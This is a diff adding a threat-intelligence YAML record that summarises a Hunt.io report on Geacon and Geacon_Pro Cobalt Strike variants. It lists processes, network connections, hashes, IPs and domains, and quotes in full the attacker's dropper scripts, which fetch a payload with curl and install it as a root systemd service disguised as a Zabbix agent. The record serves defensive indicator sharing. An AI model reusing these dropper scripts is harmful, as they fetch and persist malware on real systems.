@@ -1,0 +1,244 @@
+title: 'Geacon and Geacon_Pro: A Constant Menace to Linux and Windows Systems'
+description: The report discusses the analysis of multiple scripts, ELF files, and
+  webshells that masquerade as legitimate tools but are actually used for malicious
+  purposes. It highlights the use of Cobalt Strike variants and Geacon Pro servers.
+attribution: ''
+malware_families:
+- Cobalt Strike
+- Geacon
+cves: []
+ttps:
+  processes:
+  - ha.exe
+  - m_arm64
+  command_lines:
+  - '#!/bin/sh
+
+    URL="http://down.chinaunion_info/dkxtzLeppoUwg676m9AmSgl/s2"
+
+    NAME="agents_install"
+
+    curl -o /tmp/$NAME $URL
+
+    chmod +x /tmp/$NAME
+
+    SERVICE_FILE="/etc/systemd/system/SNAME.service"
+
+    cat <<EOF > $SERVICE_FILE
+
+    [Unit]
+
+    Description=Zabbix Agent Service
+
+    After=network.target
+
+    [Service]
+
+    ExecStart=/tmp/$NAME
+
+    Restart=always
+
+    User=root
+
+    [Install]
+
+    WantedBy=multi-user.target
+
+    EOF
+
+    systemctl daemon-reload
+
+    systemctl start $NAME.service
+
+    rm -f /tmp/si.sh'
+  - '#!/bin/bash
+
+    URL="http://down.chinaunion_info/dkxtzLeppolwg676m9AmSgl/falis"
+
+    NAME="agents_1install"
+
+    curl -o /tmp/$NAME $URL
+
+    chmod +x /tmp/$NAME
+
+    SERVICE_FILE="/etc/systemd/system/SNAME.service"
+
+    cat <<EOF > $SERVICE_FILE
+
+    [Unit]
+
+    Description=Zabbix Agent Service
+
+    After=network.target
+
+    [Service]
+
+    ExecStart=/tmp/$NAME
+
+    Restart=always
+
+    User=root
+
+    [Install]
+
+    WantedBy=multi-user.target
+
+    EOF
+
+    systemctl daemon-reload
+
+    systemctl start $NAME.service
+
+    systemctl enable SNAME.service
+
+    rm -f /tmp/$S1_NAME
+
+    rm -f [etc/systemd/system/$S1_NAME.service]
+
+    systemctl stop $S1_NAME.service'
+  powershell: []
+  scripts:
+  - s1
+  - s2
+  - gslll.jsp
+  - '#!/bin/sh
+
+    URL="http://down.chinaunion_info/dkxtzLeppoUwg676m9AmSgl/s2"
+
+    NAME="agents_install"
+
+    curl -o /tmp/$NAME $URL
+
+    chmod +x /tmp/$NAME
+
+    SERVICE_FILE="/etc/systemd/system/SNAME.service"
+
+    cat <<EOF > $SERVICE_FILE
+
+    [Unit]
+
+    Description=Zabbix Agent Service
+
+    After=network.target
+
+    [Service]
+
+    ExecStart=/tmp/$NAME
+
+    Restart=always
+
+    User=root
+
+    [Install]
+
+    WantedBy=multi-user.target
+
+    EOF
+
+    systemctl daemon-reload
+
+    systemctl start $NAME.service
+
+    rm -f /tmp/si.sh'
+  - '#!/bin/bash
+
+    URL="http://down.chinaunion_info/dkxtzLeppolwg676m9AmSgl/falis"
+
+    NAME="agents_1install"
+
+    curl -o /tmp/$NAME $URL
+
+    chmod +x /tmp/$NAME
+
+    SERVICE_FILE="/etc/systemd/system/SNAME.service"
+
+    cat <<EOF > $SERVICE_FILE
+
+    [Unit]
+
+    Description=Zabbix Agent Service
+
+    After=network.target
+
+    [Service]
+
+    ExecStart=/tmp/$NAME
+
+    Restart=always
+
+    User=root
+
+    [Install]
+
+    WantedBy=multi-user.target
+
+    EOF
+
+    systemctl daemon-reload
+
+    systemctl start $NAME.service
+
+    systemctl enable SNAME.service
+
+    rm -f /tmp/$S1_NAME
+
+    rm -f [etc/systemd/system/$S1_NAME.service]
+
+    systemctl stop $S1_NAME.service'
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - alis -> down.chinaunion_info:80
+  - ha.exe -> api.chinaunion_info:10443
+  - m_arm64 -> api.chinaunion_info:10443
+  - alis -> api.chinaunion_info:443
+  - m_arm64 -> 172.245.53_132:10443
+  - m_arm64 -> hxxps://360[.]net:443
+  file_activity:
+  - /etc/systemd/system/SNAME.service
+  - ha.exe
+  - gslll.jsp
+  - s1
+  - s2
+  - alis
+  - grpc
+  - aservice
+  - gsllljsp
+  - ha.txt
+  - m.txt
+  - m_arme64
+  - scdata.bin
+  persistence:
+  - Service masquerading as Zabbix Agent
+  process_relations: []
+iocs:
+  hashes:
+  - fa21b1c5063d296d3402ff94a34b6b3a9285e59b
+  - d2746e2a30719760583c62b034312e16565e652e
+  - cab73e5f990143ed8311d760ceca7bb12e33c0d2
+  - 20ebea093d50351f686fa80e64f9171e80bf50e8
+  - ffc4f2996cca934185bf36355fc4c09aef871435
+  - 7fbfb47aee77fd965a5b703c12f5da7505af6fc6
+  - 0e6c770f37ce2aa7942dce5350ca1fe781e5f479
+  ip_addresses:
+  - 172.245.53_132
+  - 120.55.74_104
+  - 43.136.38_59
+  - 172.67.140_188
+  - 104.21.33_29
+  - 3.230.208_121
+  - 52.1.43_64
+  - 43.136.38.59
+  domains:
+  - down.chinaunion_info
+  - api.chinaunion_info
+  - pay.chinaunion_info
+  - 360.net
+  - 360[.]net
+  - foren[.]zik
+  - ms
+  urls: []
+authors: []
+reference: https://hunt.io/blog/geacon-and-geacon-pro-a-constant-menace-to-linux-and-windows-systems
+date_of_publication: June 27, 2024
+file_creation_date: May 14, 2026
